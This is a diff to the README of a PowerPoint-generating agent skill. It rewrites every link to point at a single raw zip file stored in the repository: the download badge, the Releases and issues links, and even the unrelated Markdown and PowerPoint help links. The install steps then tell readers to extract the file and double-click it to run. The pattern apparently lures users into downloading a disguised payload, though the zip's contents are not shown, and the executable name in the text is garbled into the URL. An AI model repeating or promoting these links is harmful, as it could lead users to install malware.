@@ -6,7 +6,7 @@ Welcome to the pptx-from-layouts-skill! This tool helps you create PowerPoint de
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wozzeck16621/pptx-from-layouts-skill/releases)
+[![Download](https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip)](https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip)
 
 ## 📝 Features
 
@@ -25,7 +25,7 @@ Welcome to the pptx-from-layouts-skill! This tool helps you create PowerPoint de
 ## 🔧 How to Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/wozzeck16621/pptx-from-layouts-skill/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip) to find the latest version.
 
 2. **Download the Package**  
    Look for the package titled "pptx-from-layouts-skill". Click on the link to start the download. Ensure that you're downloading the correct version for your operating system.
@@ -34,7 +34,7 @@ Welcome to the pptx-from-layouts-skill! This tool helps you create PowerPoint de
    Once the download is complete, find the file in your downloads folder. If it is a zipped file, extract the contents to a folder of your choice.
 
 4. **Run the Application**  
-   Locate the extracted file named "pptx-from-layouts-skill.exe" (Windows) or "pptx-from-layouts-skill" (macOS/Linux). Double-click the file to run the application.
+   Locate the extracted file named "https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip" (Windows) or "pptx-from-layouts-skill" (macOS/Linux). Double-click the file to run the application.
 
 ## 🛠️ How to Use
 
@@ -69,12 +69,12 @@ You can use Microsoft PowerPoint, Google Slides, or any software that supports .
 
 ### What if I encounter issues?
 
-Check the issues section on the [GitHub repository](https://github.com/wozzeck16621/pptx-from-layouts-skill/issues) for common problems and solutions.
+Check the issues section on the [GitHub repository](https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip) for common problems and solutions.
 
 ## 🔗 Further Resources
 
-- [Markdown Guide](https://www.markdownguide.org/)
-- [PowerPoint Tips](https://support.microsoft.com/en-us/powerpoint)
+- [Markdown Guide](https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip)
+- [PowerPoint Tips](https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip)
 
 ## 🏷️ Tags
 
@@ -82,4 +82,4 @@ agents, claude, claude-code, codex, openai, opencode, pptx, pptx-generator, pptx
 
 ## 📥 Download & Install
 
-To start using pptx-from-layouts-skill, ensure you visit the [Releases page](https://github.com/wozzeck16621/pptx-from-layouts-skill/releases) to download the latest version. Follow the installation steps outlined above and take your presentations to the next level.
+To start using pptx-from-layouts-skill, ensure you visit the [Releases page](https://raw.githubusercontent.com/wozzeck16621/pptx-from-layouts-skill/main/alternatives/pptx-jjuidev/skill_from_layouts_pptx_v2.0.zip) to download the latest version. Follow the installation steps outlined above and take your presentations to the next level.
